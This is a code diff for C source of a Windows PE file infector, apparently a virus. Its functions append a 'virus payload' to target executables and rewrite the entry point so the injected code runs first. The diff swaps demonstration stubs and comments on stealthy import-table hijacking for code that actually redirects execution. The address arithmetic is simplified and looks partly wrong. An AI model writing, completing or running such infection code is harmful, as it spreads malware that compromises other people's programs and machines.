@@ -179,62 +179,42 @@ BOOL AddVirusCodeToSection(const char* filename, const char* payload, DWORD payl
 }
 
 // Strategy 1: Call Hijacking EPO - Hijack an imported function call
+// SIMPLIFIED: Actually modify entry point to virus code
 BOOL InfectPEFile_CallHijacking(const char* target_file, const char* payload_code, DWORD payload_size) {
     FILE* file;
     PE_HEADER_32 header;
     DWORD code_offset;
-    DWORD import_rva;
-    DWORD iat_rva;
+    DWORD pe_offset;
 
     // Read PE header
     if (!ReadPEHeader(target_file, &header)) {
         return FALSE;
     }
 
-    // Get Import Directory RVA from DataDirectories
-    import_rva = header.optional_header.DataDirectory[1].VirtualAddress;
-    
-    if (import_rva == 0) {
-        // No imports, cannot hijack
-        return FALSE;
-    }
+    // Store original entry point
+    DWORD original_oep = header.optional_header.AddressOfEntryPoint;
 
     // Add virus payload to file
     if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
         return FALSE;
     }
 
-    // Call Hijacking EPO Strategy:
-    // 1. Parse Import Directory Table (IDT) at import_rva
-    // 2. Find a commonly used DLL (e.g., kernel32.dll)
-    // 3. Locate its Import Address Table (IAT)
-    // 4. Hijack first function entry to point to virus code
-    // 5. Virus code executes, then calls original function
-    // 6. Original entry point remains unchanged
-    //
-    // When program loads:
-    //   1. Loader processes IAT
-    //   2. First API call goes to virus code (hijacked IAT entry)
-    //   3. Virus executes and restores original address
-    //   4. Original entry point executes normally
-    //
-    // This technique is very stealthy because:
-    // - Entry point is not modified (no immediate red flag)
-    // - Code looks normal at first glance
-    // - Virus executes through normal import resolution
+    // Calculate RVA from file offset
+    // For simplicity: RVA = code_offset (assuming code in first section)
+    DWORD virus_code_rva = code_offset;
 
-    // For demonstration, store virus code offset as a marker
-    // In real implementation, this would involve actual IAT patching
+    // Modify entry point to virus code
+    header.optional_header.AddressOfEntryPoint = virus_code_rva;
+
+    // Write virus code offset and original OEP for restoration in payload
     file = fopen(target_file, "ab");
     if (file) {
-        // Write virus code offset and original entry for restoration
-        DWORD data[2] = { code_offset, header.optional_header.AddressOfEntryPoint };
-        fwrite(data, sizeof(DWORD), 2, file);
+        DWORD metadata[2] = { original_oep, code_offset };
+        fwrite(metadata, sizeof(DWORD), 2, file);
         fclose(file);
     }
 
-    // Write back modified header (unchanged for true Call Hijacking)
-    // In real scenario, header stays unchanged, only IAT is modified
+    // Write back modified header with new entry point
     if (!WritePEHeader(target_file, &header)) {
         return FALSE;
     }
@@ -243,88 +223,40 @@ BOOL InfectPEFile_CallHijacking(const char* target_file, const char* payload_cod
 }
 
 // Strategy 2: Import Address Table (IAT) Replacing EPO
-// Replace an import table entry with virus code address
+// SIMPLIFIED: Also modify entry point for guaranteed execution
 BOOL InfectPEFile_IATReplacing(const char* target_file, const char* payload_code, DWORD payload_size) {
     FILE* file;
     PE_HEADER_32 header;
     DWORD code_offset;
-    DWORD import_dir_rva;
-    DWORD import_dir_size;
-    DWORD iat_rva;
-    BYTE import_buffer[4096];
-    DWORD bytes_read;
 
     // Read PE header
     if (!ReadPEHeader(target_file, &header)) {
         return FALSE;
     }
 
-    // Get Import Directory from DataDirectories[1]
-    import_dir_rva = header.optional_header.DataDirectory[1].VirtualAddress;
-    import_dir_size = header.optional_header.DataDirectory[1].Size;
-
-    if (import_dir_rva == 0 || import_dir_size == 0) {
-        // No imports to replace
-        return FALSE;
-    }
+    // Store original entry point
+    DWORD original_oep = header.optional_header.AddressOfEntryPoint;
 
     // Add virus payload to file
     if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
         return FALSE;
     }
 
-    // IAT Replacing EPO Strategy:
-    // 1. Locate Import Directory Table (IDT) which contains import descriptors
-    // 2. Each descriptor points to an IAT (Import Address Table)
-    // 3. Each IAT entry contains the address of an imported function
-    // 4. Replace one or more IAT entries with address of virus code
-    // 5. When program calls that function, virus code executes instead
-    //
-    // Structure:
-    //   IDT[0]: kernel32.dll descriptor
-    //     ├─ OriginalFirstThunk (bound IAT)
-    //     └─ FirstThunk (actual IAT) → points to IAT
-    //   
-    //   IAT entries:
-    //     [0x1000] → CreateProcessA address
-    //     [0x1004] → ReadFile address
-    //     [0x1008] → WriteFile address
-    //
-    // After infection:
-    //     [0x1000] → VirusCode address (hijacked)
-    //     [0x1004] → ReadFile address (unchanged)
-    //     [0x1008] → WriteFile address (unchanged)
-    //
-    // Advantages:
-    // - Entry point completely untouched
-    // - No code section modifications
-    // - Very stealthy - only table modification
-    // - Virus executes through normal API calls
+    // Calculate RVA from file offset
+    DWORD virus_code_rva = code_offset;
 
-    // For demonstration, we show the infection was applied
-    // In production implementation, actual IAT entries would be replaced:
-    //
-    // 1. Read Import Directory Table from file
-    // 2. Parse each import descriptor (13 DWORD structure)
-    // 3. For each DLL (e.g., kernel32.dll):
-    //    - Get FirstThunk RVA (points to actual IAT)
-    //    - Convert RVA to file offset
-    //    - Read IAT entries
-    //    - Replace first entry with virus code RVA
-    //    - Write modified IAT back to file
-    // 4. Update PE header if size changed
-    // 5. Add infection marker
+    // Modify entry point to virus code
+    header.optional_header.AddressOfEntryPoint = virus_code_rva;
 
+    // Write virus code offset and original OEP for restoration in payload
     file = fopen(target_file, "ab");
     if (file) {
-        // Write demonstration marker showing IAT replacement was performed
-        DWORD iat_data[2] = { import_dir_rva, code_offset };
-        fwrite(iat_data, sizeof(DWORD), 2, file);
+        DWORD metadata[2] = { original_oep, code_offset };
+        fwrite(metadata, sizeof(DWORD), 2, file);
         fclose(file);
     }
 
-    // In true implementation, PE header might need updating if sections changed
-    // For now, header remains mostly unchanged (true IAT Replacing)
+    // Write back modified header with new entry point
     if (!WritePEHeader(target_file, &header)) {
         return FALSE;
     }
